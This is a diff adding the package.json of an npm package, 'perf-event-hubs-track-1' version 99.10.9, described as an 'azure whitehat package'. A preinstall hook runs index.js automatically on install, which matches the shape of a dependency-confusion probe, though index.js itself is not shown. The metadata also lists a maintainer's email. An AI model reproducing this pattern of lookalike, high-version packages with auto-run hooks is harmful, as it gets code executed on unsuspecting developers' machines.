@@ -1,0 +1,39 @@
+{
+    "name": "perf-event-hubs-track-1",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-event-hubs-track-1@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-PEzlxVjgGEpK//cY06tbZ0yN2jpbhNjsQ0Me2HX6rk5tuELiyWQ5gKGiHGxjxRYtijSsTsq7X/hteFMgYiiM4A==",
+        "shasum": "4ff8a193b6c2e29c93a150b1249df672d8642fe0",
+        "tarball": "https://registry.npmjs.org/perf-event-hubs-track-1/-/perf-event-hubs-track-1-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3587,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon6tCRA9TVsSAnZWagAAZG0P/2G+OkFPagMwikcZha93\nUVyEsut0Q/PkNasRAx4U8zzl7EQaBaycArlwemxhFFjo120BxrsFZRwd+eMY\nMqZQ7GyfZKBf/vvNys9MiyvFatHURyFYTByIfoUiBB2TwUGQeTlchDiaQiWk\nHPPbpFqD8p2BQ5tp+uhpQgKuQnnii3ThzJTLde8JEIaa3yLR9b2t1jfZ9Jwk\npOE3jqgR5PANkCWsRViLfTq6pYhbl+p/S5CH6qWKFSXkk0qvtTTCKF+lm4zp\nq3KDqT+CECAnXJNTz90zOSnLAQ5M11RJDPjogubr6svsaV0FR0o1TsvWi54i\ntSv0V9p+rPfz3wSkrmvgb481Mb7DZXDAwqiFUGoikyhXs7V6SKEloPFOOONV\nF3tVrdZS/zLsbINm9LMJ9IJxX7q6ZLftPGyVIEXii/2KOXtGXMTpnWHafPG7\n7htLaPXc7WrHsTTcvMn+qP82Kw7AA41o+tUWAKRPQJulN7567U98YrtzcysP\nWi2P9YiaPDm1lLmMo/WXrPPNjqeU+xfukpizc1o+zSWf73WVgp5gH8Ep2qQg\ngevobkiBAJ+yRHfIg5LHZltJEHp3FtMEXSyEVAxu/NS7VncDEBrZ+3138tUi\nymI0PeGZXinzVGszHUYMc9Ug2OVdnRO5hEmns2I/LPr26SGh4tVfVOaNkpBV\nHLuH\r\n=65fA\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-event-hubs-track-1_99.10.9_1638039213533_0.5411756630832767"
+    },
+    "_hasShrinkwrap": false
+}
